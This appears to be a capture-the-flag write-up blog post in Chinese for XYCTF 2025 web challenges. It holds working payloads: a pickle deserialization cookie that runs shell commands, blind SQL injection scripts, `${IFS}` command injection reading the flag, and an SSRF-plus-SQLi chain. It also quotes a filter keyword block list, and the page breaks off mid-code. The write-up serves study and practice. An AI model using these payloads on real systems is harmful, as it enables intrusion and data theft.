<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    :   main.py</span></span><br><span class="line"><span class="string">@Time    :   2025/03/28 22:20:49</span></span><br><span class="line"><span class="string">@Author  :   LamentXU </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">flag in /flag_&#123;uuid4&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">from</span> bottle <span class="keyword">import</span> Bottle, request, response, redirect, static_file, run, route</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;../../secret.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    secret = f.read()</span><br><span class="line"></span><br><span class="line">app = Bottle()</span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;HI&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/download&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>():</span><br><span class="line">    name = request.query.filename</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;../../&#x27;</span> <span class="keyword">in</span> name <span class="keyword">or</span> name.startswith(<span class="string">&#x27;/&#x27;</span>) <span class="keyword">or</span> name.startswith(<span class="string">&#x27;../&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;\\&#x27;</span> <span class="keyword">in</span> name:</span><br><span class="line">        response.status = <span class="number">403</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Forbidden&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(name, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/secret&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">secret_page</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        session = request.get_cookie(<span class="string">&quot;name&quot;</span>, secret=secret)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> session <span class="keyword">or</span> session[<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;guest&quot;</span>:</span><br><span class="line">            session = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;guest&quot;</span>&#125;</span><br><span class="line">            response.set_cookie(<span class="string">&quot;name&quot;</span>, session, secret=secret)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Forbidden!&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> session[<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;The secret has been deleted!&#x27;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Error!&quot;</span></span><br><span class="line">run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>, debug=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>提示了一个secret文件，/download路由能读取文件内容，但是有一定过滤，/secret路由看上去是生成cookie和检查cookie用的，/根目录
./当前目录
../上一级目录，这里我们穿插使用./.././../secret.txt能够绕过waf，读取到secret的内容<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406211100373.png"
                      class=""
                ></p>
<p><code>Hell0_H@cker_Y0u_A3r_Sm@r7</code>然后看/secret路由，我们通过模块bottle看看get_cookie和set_cookie的内容</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">set_cookie</span>(<span class="params">self, name, value, secret=<span class="literal">None</span>, digestmod=hashlib.sha256, **options</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="variable language_">self</span>._cookies:</span><br><span class="line">        <span class="variable language_">self</span>._cookies = SimpleCookie()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Monkey-patch Cookie lib to support &#x27;SameSite&#x27; parameter</span></span><br><span class="line">    <span class="comment"># https://tools.ietf.org/html/draft-west-first-party-cookies-07#section-4.1</span></span><br><span class="line">    <span class="keyword">if</span> py &lt; (<span class="number">3</span>, <span class="number">8</span>, <span class="number">0</span>):</span><br><span class="line">        Morsel._reserved.setdefault(<span class="string">&#x27;samesite&#x27;</span>, <span class="string">&#x27;SameSite&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> secret:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(value, basestring):</span><br><span class="line">            depr(<span class="number">0</span>, <span class="number">13</span>, <span class="string">&quot;Pickling of arbitrary objects into cookies is &quot;</span></span><br><span class="line">                        <span class="string">&quot;deprecated.&quot;</span>, <span class="string">&quot;Only store strings in cookies. &quot;</span></span><br><span class="line">                        <span class="string">&quot;JSON strings are fine, too.&quot;</span>)</span><br><span class="line">        encoded = base64.b64encode(pickle.dumps([name, value], -<span class="number">1</span>))</span><br><span class="line">        sig = base64.b64encode(hmac.new(tob(secret), encoded,</span><br><span class="line">                                        digestmod=digestmod).digest())</span><br><span class="line">        value = touni(tob(<span class="string">&#x27;!&#x27;</span>) + sig + tob(<span class="string">&#x27;?&#x27;</span>) + encoded)</span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(value, basestring):</span><br><span class="line">        <span class="keyword">raise</span> TypeError(<span class="string">&#x27;Secret key required for non-string cookies.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Cookie size plus options must not exceed 4kb.</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(name) + <span class="built_in">len</span>(value) &gt; <span class="number">3800</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&#x27;Content does not fit into a cookie.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">self</span>._cookies[name] = value</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> key, value <span class="keyword">in</span> options.items():</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">in</span> (<span class="string">&#x27;max_age&#x27;</span>, <span class="string">&#x27;maxage&#x27;</span>): <span class="comment"># &#x27;maxage&#x27; variant added in 0.13</span></span><br><span class="line">            key = <span class="string">&#x27;max-age&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(value, timedelta):</span><br><span class="line">                value = value.seconds + value.days * <span class="number">24</span> * <span class="number">3600</span></span><br><span class="line">        <span class="keyword">if</span> key == <span class="string">&#x27;expires&#x27;</span>:</span><br><span class="line">            value = http_date(value)</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">in</span> (<span class="string">&#x27;same_site&#x27;</span>, <span class="string">&#x27;samesite&#x27;</span>): <span class="comment"># &#x27;samesite&#x27; variant added in 0.13</span></span><br><span class="line">            key, value = <span class="string">&#x27;samesite&#x27;</span>, (value <span class="keyword">or</span> <span class="string">&quot;none&quot;</span>).lower()</span><br><span class="line">            <span class="keyword">if</span> value <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&#x27;lax&#x27;</span>, <span class="string">&#x27;strict&#x27;</span>, <span class="string">&#x27;none&#x27;</span>):</span><br><span class="line">                <span class="keyword">raise</span> CookieError(<span class="string">&quot;Invalid value for SameSite&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">in</span> (<span class="string">&#x27;secure&#x27;</span>, <span class="string">&#x27;httponly&#x27;</span>) <span class="keyword">and</span> <span class="keyword">not</span> value:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="variable language_">self</span>._cookies[name][key] = value</span><br></pre></td></tr></table></figure></div>
<p>能够看到set_cookie对name和value进行了pickle序列化，</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_cookie</span>(<span class="params">self, key, default=<span class="literal">None</span>, secret=<span class="literal">None</span>, digestmod=hashlib.sha256</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; Return the content of a cookie. To read a `Signed Cookie`, the</span></span><br><span class="line"><span class="string">        `secret` must match the one used to create the cookie (see</span></span><br><span class="line"><span class="string">        :meth:`BaseResponse.set_cookie`). If anything goes wrong (missing</span></span><br><span class="line"><span class="string">        cookie or wrong signature), return a default value. &quot;&quot;&quot;</span></span><br><span class="line">    value = <span class="variable language_">self</span>.cookies.get(key)</span><br><span class="line">    <span class="keyword">if</span> secret:</span><br><span class="line">        <span class="comment"># See BaseResponse.set_cookie for details on signed cookies.</span></span><br><span class="line">        <span class="keyword">if</span> value <span class="keyword">and</span> value.startswith(<span class="string">&#x27;!&#x27;</span>) <span class="keyword">and</span> <span class="string">&#x27;?&#x27;</span> <span class="keyword">in</span> value:</span><br><span class="line">            sig, msg = <span class="built_in">map</span>(tob, value[<span class="number">1</span>:].split(<span class="string">&#x27;?&#x27;</span>, <span class="number">1</span>))</span><br><span class="line">            <span class="built_in">hash</span> = hmac.new(tob(secret), msg, digestmod=digestmod).digest()</span><br><span class="line">            <span class="keyword">if</span> _lscmp(sig, base64.b64encode(<span class="built_in">hash</span>)):</span><br><span class="line">                dst = pickle.loads(base64.b64decode(msg))</span><br><span class="line">                <span class="keyword">if</span> dst <span class="keyword">and</span> dst[<span class="number">0</span>] == key:</span><br><span class="line">                    <span class="keyword">return</span> dst[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">return</span> default</span><br><span class="line">    <span class="keyword">return</span> value <span class="keyword">or</span> default</span><br></pre></td></tr></table></figure></div>
<p>而get_cookie对数据进行了pickle反序列化，我们打pickle反序列化的<code>__reduce__</code>重写漏洞https://blog.51cto.com/u_12205/8710727参考这篇文章</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406211838986.png"
                      class=""
                >
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    :   main.py</span></span><br><span class="line"><span class="string">@Time    :   2025/03/28 22:20:49</span></span><br><span class="line"><span class="string">@Author  :   LamentXU </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">flag in /flag_&#123;uuid4&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">from</span> bottle <span class="keyword">import</span> Bottle, request, response, redirect, static_file, run, route</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">People</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;ls /&gt;app.py&#x27;)&quot;</span>,))</span><br><span class="line">app = Bottle()</span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/secret&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">secret_page</span>():</span><br><span class="line">    a = People()</span><br><span class="line">    session = &#123;<span class="string">&quot;name&quot;</span>: a&#125;</span><br><span class="line">    response.set_cookie(<span class="string">&quot;name&quot;</span>, session, secret=<span class="string">&quot;Hell0_H@cker_Y0u_A3r_Sm@r7&quot;</span>)</span><br><span class="line">run(host=<span class="string">&#x27;127.0.0.1&#x27;</span>, port=<span class="number">8088</span>, debug=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>在本地开一个用来生成cookie，将命令内容输出到app.py用/download界面查看</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406213100890.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406213109708.png"
                      class=""
                >
<p>直接读就行</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406213133619.png"
                      class=""
                >
<p>flag{We1c0me_t0_XYCTF_2o25!The_secret_1s_L@men7XU_L0v3_u!}</p>
<h4 id="web-ezsql手动滑稽">web-ezsql(手动滑稽)</h4>
<p>进入为一个登录界面，由题目知为sql，进行测试，在username处注入，测试得到过滤了空格，union，逗号，于是放弃常规注入，但是查询失败会回显账号或密码错误用的<code>&lt;strong&gt;</code>表情包裹，选择布尔盲注，使用%09绕过空格，<code>substr(database()%09from%091%09for%091)=“x”</code>用于判断，下面是爆破脚本</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line">url=<span class="string">&quot;http://eci-2ze9y7npewuaazcmbwx0.cloudeci1.ichunqiu.com//login.php&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        temp=<span class="string">&quot;1&#x27;%09or%09ascii(substr(database()%09from%09&quot;</span>+<span class="built_in">str</span>(i+<span class="number">1</span>)+<span class="string">&quot;%09for%091))=&quot;</span>+<span class="built_in">str</span>(j)+<span class="string">&quot;#&quot;</span></span><br><span class="line">        temp=unquote(temp)</span><br><span class="line">        payload=&#123;<span class="string">&quot;username&quot;</span>:temp,</span><br><span class="line">                 <span class="string">&quot;password&quot;</span>:<span class="number">1</span></span><br><span class="line">                 &#125;</span><br><span class="line">        response=requests.post(url,data=payload)<span class="comment">#爆库名</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;&lt;strong&gt;&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="comment">#print(response.text)</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(j),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line">url=<span class="string">&quot;http://eci-2ze9y7npewuaazcmbwx0.cloudeci1.ichunqiu.com//login.php&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        temp=<span class="string">&quot;1&#x27;%09or%09ascii(substr((select%09group_concat(secret)%09from%09double_check)%09from%09&quot;</span>+<span class="built_in">str</span>(i+<span class="number">1</span>)+<span class="string">&quot;%09for%091))=&quot;</span>+<span class="built_in">str</span>(j)+<span class="string">&quot;#&quot;</span>    <span class="comment">#调整内部内容即可爆破表名、字段、内容</span></span><br><span class="line">        temp=unquote(temp)</span><br><span class="line">        payload=&#123;<span class="string">&quot;username&quot;</span>:temp,</span><br><span class="line">                 <span class="string">&quot;password&quot;</span>:<span class="number">1</span></span><br><span class="line">                 &#125;</span><br><span class="line">        response=requests.post(url,data=payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;&lt;strong&gt;&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="comment">#print(response.text)</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(j),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure></div>
<p>最终得到的信息有：</p>
<p>库名testdb 表 double_check,user 字段secret,username,password
内容password：zhonghengyisheng username：yudeyoushang
secret：dtfrtkcc0czkoua9S</p>
<p>我们拿着这个信息登录<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406210259268.png"
                      class=""
                ></p>
<p>进入到一个无回显的命令执行页面，测试发现过滤了空格，用${IFS}<span
class="math inline">\(9绕过，用&gt;将内容写入新页面`ls\)</span>{IFS}$9/&gt;1.txt`<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406210421004.png"
                      class=""
                ></p>
<p>cat${IFS}$9/f*&gt;2.txt<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406210508212.png"
                      class=""
                ></p>
<p>XYCTF{ea54fff6-d3db-4055-95b4-6b13330d5b02}</p>
<h4 id="web-fate">web-fate</h4>
<p>直接看附件，定义了很多函数和路由，我这里的思路是先看看怎么走到db_search(),既然有过滤，说明需要过去，<code>if flask.request.remote_addr == '127.0.0.1':</code>需要我们以本地IP访问才能够进入/1337路由，这里又看向/proxy路由，</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/proxy&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nolettersproxy</span>():</span><br><span class="line">    url = flask.request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url:</span><br><span class="line">        <span class="keyword">return</span> flask.abort(<span class="number">400</span>, <span class="string">&#x27;No URL provided&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    target_url = <span class="string">&quot;http://lamentxu.top&quot;</span> + url</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> url:</span><br><span class="line">            <span class="keyword">return</span> flask.abort(<span class="number">403</span>, <span class="string">&#x27;I blacklist the whole alphabet, hiahiahiahiahiahiahia~~~~~~&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;.&quot;</span> <span class="keyword">in</span> url:</span><br><span class="line">        <span class="keyword">return</span> flask.abort(<span class="number">403</span>, <span class="string">&#x27;No ssrf allowed&#x27;</span>)</span><br><span class="line">    response = requests.get(target_url)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.Response(response.content, response.status_code)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db_search</span>(<span class="params">code</span>):</span><br><span class="line">    <span class="keyword">with</span> sqlite3.connect(<span class="string">&#x27;database.db&#x27;</span>) <span class="keyword">as</span> conn:</span><br><span class="line">        cur = conn.cursor()</span><br><span class="line">        cur.execute(<span class="string">f&quot;SELECT FATE FROM FATETABLE WHERE NAME=UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(&#x27;<span class="subst">&#123;code&#125;</span>&#x27;)))))))&quot;</span>)</span><br><span class="line">        found = cur.fetchone()</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span> <span class="keyword">if</span> found <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">else</span> found[<span class="number">0</span>]</span><br></pre></td></tr></table></figure></div>
<p>能够get传入url拼接在http://lamentxu.top的后面，有黑名单检测，内容为所有字母，并且过滤了点号，这里考虑SSRF，使用@能重定向为我们传入的url，我们想要ip为本地（127.0.0.1），这里使用连续十进制绕过，也就是2130706433，端口为8080</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250405234435982.png"
                      class=""
                >
<p>看到这个返回结果也是确定自己访问成功了，下一步是传入0的参数，值为abcdefghi，但是传入的url不能有字母，我们考虑到SSRF会进行1次url解码，我们用bp传会自动url解码1次，固2次url编码即可绕过，</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250405234624315.png"
                      class=""
                >
<p>到了传json数据的那一步，我们要把name为键名的数据进行json序列化再转化为二进制传入，这里我写了一个脚本便于实现（脚本里已经写了payload，下文解释）</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="built_in">str</span>=&#123;<span class="string">&quot;name&quot;</span>:&#123;<span class="string">&quot;))))))) union select group_concat(FATE) FROM FATETABLE--+&quot;</span>:<span class="string">&quot;1&quot;</span>&#125;&#125;</span><br><span class="line"><span class="comment">#str=&#123;&quot;name&quot;:[&quot;LAMENTXU&quot;]&#125;</span></span><br><span class="line">b=json.dumps(<span class="built_in">str</span>)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">string_to_binary</span>(<span class="params">input_string</span>):</span><br><span class="line">    <span class="comment"># 将每个字符转换为其 ASCII 值的二进制表示，并确保每个二进制字符串长度为 8</span></span><br><span class="line">    binary_chunks = [<span class="built_in">format</span>(<span class="built_in">ord</span>(char), <span class="string">&#x27;08b&#x27;</span>) <span class="keyword">for</span> char <span class="keyword">in</span> input_string]</span><br><span class="line">    <span class="comment"># 将所有二进制字符串连接在一起</span></span><br><span class="line">    binary_string = <span class="string">&#x27;&#x27;</span>.join(binary_chunks)</span><br><span class="line">    <span class="keyword">return</span> binary_string</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">binary_to_string</span>(<span class="params">binary_string</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(binary_string) % <span class="number">8</span> != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Binary string length must be a multiple of 8&quot;</span>)</span><br><span class="line">    binary_chunks = [binary_string[i:i + <span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(binary_string), <span class="number">8</span>)]</span><br><span class="line">    string_output = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">int</span>(chunk, <span class="number">2</span>)) <span class="keyword">for</span> chunk <span class="keyword">in</span> binary_chunks)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> string_output</span><br><span class="line">a=string_to_binary(b)</span><br><span class="line"><span class="built_in">print</span>(string_to_binary(b))</span><br><span class="line"><span class="built_in">print</span>(binary_to_string(a))</span><br><span class="line"><span class="built_in">print</span>(json.loads(b))</span><br></pre></td></tr></table></figure></div>
<p>看到源代码用len(name)限制了长度，不让我们直接查询LAMENTXU的FATE值（这些fate值在init_db.py里），但是如果我们构造{"name":{"123":"123"}}字典嵌套字典，会发现len的计数只有1，但是我们传入的LAMENTXU是无法被使用的，因为具有其他字符以及大括号，那我们考虑闭合引号和右括号，由于我们name的值是一个字典，所有对引号和右括号的过滤是无效的，</p>
<p><code>&#123;"name":&#123;"))))))) or 1=1--+":"1"&#125;&#125;</code>我用这个字符串进行测试，传入后发现成功执行了SQL语句，用order
by发现列数为1，由此得到payload为<code>&#123;"name":&#123;"))))))) union select group_concat(FATE) FROM FATETABLE--+":"1"&#125;&#125;</code><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250405235559760.png"
                      class=""
                ></p>
<p><code>/proxy?url=@2130706433:8080/1337?0=%61%62%63%64%65%66%67%68%69&ampcode>（二进制的序列号字符串，图片为url编码后）</p>
<p>flag{Do4t_bElIevE_in_FatE_Y1s_Y0u_2_a_Js0n_ge1nus!}</p>
<h4 id="web-now-you-see-me-1">web-Now you see me 1</h4>
<p>审计给的代码，一堆helloworld，但是其中藏了真代码，是base64编码的，解码下来看看</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">enable_hook =  <span class="literal">False</span></span><br><span class="line">counter = <span class="number">0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">audit_checker</span>(<span class="params">event,args</span>):</span><br><span class="line">    <span class="keyword">global</span> counter</span><br><span class="line">    <span class="keyword">if</span> enable_hook:</span><br><span class="line">        <span class="keyword">if</span> event <span class="keyword">in</span> [<span class="string">&quot;exec&quot;</span>, <span class="string">&quot;compile&quot;</span>]:</span><br><span class="line">            counter += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> counter &gt; <span class="number">4</span>:</span><br><span class="line">                <span class="keyword">raise</span> RuntimeError(event)</span><br><span class="line"></span><br><span class="line">lock_within = [</span><br><span class="line">    <span class="string">&quot;debug&quot;</span>, <span class="string">&quot;form&quot;</span>, <span class="string">&quot;args&quot;</span>, <span class="string">&quot;values&quot;</span>,</span><br><span class="line">    <span class="string">&quot;headers&quot;</span>, <span class="string">&quot;json&quot;</span>, <span class="string">&quot;stream&quot;</span>, <span class="string">&quot;environ&quot;</span>,</span><br><span class="line">    <span class="string">&quot;files&quot;</span>, <span class="string">&quot;method&quot;</span>, <span class="string">&quot;cookies&quot;</span>, <span class="string">&quot;application&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;data&#x27;</span>, <span class="string">&#x27;url&#x27;</span> ,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;getattr&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;&#123;&#123;&quot;</span>, <span class="string">&quot;&#125;&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;[&quot;</span>, <span class="string">&quot;]&quot;</span>, <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;/&quot;</span>,<span class="string">&quot;self&quot;</span>,</span><br><span class="line">    <span class="string">&quot;lipsum&quot;</span>, <span class="string">&quot;cycler&quot;</span>, <span class="string">&quot;joiner&quot;</span>, <span class="string">&quot;namespace&quot;</span>,</span><br><span class="line">    <span class="string">&quot;init&quot;</span>, <span class="string">&quot;dir&quot;</span>, <span class="string">&quot;join&quot;</span>, <span class="string">&quot;decode&quot;</span>,</span><br><span class="line">    <span class="string">&quot;batch&quot;</span>, <span class="string">&quot;first&quot;</span>, <span class="string">&quot;last&quot;</span> ,</span><br><span class="line">    <span class="string">&quot; &quot;</span>,<span class="string">&quot;dict&quot;</span>,<span class="string">&quot;list&quot;</span>,<span class="string">&quot;g.&quot;</span>,</span><br><span class="line">    <span class="string">&quot;os&quot;</span>, <span class="string">&quot;subprocess&quot;</span>,</span><br><span class="line">    <span class="string">&quot;g|a&quot;</span>, <span class="string">&quot;GLOBALS&quot;</span>, <span class="string">&quot;lower&quot;</span>, <span class="string">&quot;upper&quot;</span>,</span><br><span class="line">    <span class="string">&quot;BUILTINS&quot;</span>, <span class="string">&quot;select&quot;</span>, <span class="string">&quot;WHOAMI&quot;</span>, <span class="string">&quot;path&quot;</span>,</span><br><span class="line">    <span class="string">&quot;os&quot;</span>, <span class="string">&quot;popen&quot;</span>, <span class="string">&quot;cat&quot;</span>, <span class="string">&quot;nl&quot;</span>, <span class="string">&quot;app&quot;</span>, <span class="string">&quot;setattr&quot;</span>, <span class="string">&quot;translate&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sort&quot;</span>, <span class="string">&quot;base64&quot;</span>, <span class="string">&quot;encode&quot;</span>, <span class="string">&quot;\\u&quot;</span>, <span class="string">&quot;pop&quot;</span>, <span class="string">&quot;referer&quot;</span>,</span><br><span class="line">    <span class="string">&quot;The closer you see, the lesser you find.&quot;</span>]</span><br><span class="line">        <span class="comment"># I hate all these.</span></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;try /H3dden_route&#x27;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/H3dden_route&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r3al_ins1de_th0ught</span>():</span><br><span class="line">    <span class="keyword">global</span> enable_hook, counter</span><br><span class="line">    name = flask.request.args.get(<span class="string">&#x27;My_ins1de_w0r1d&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> name:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> name.startswith(<span class="string">&quot;Follow-your-heart-&quot;</span>):</span><br><span class="line">                <span 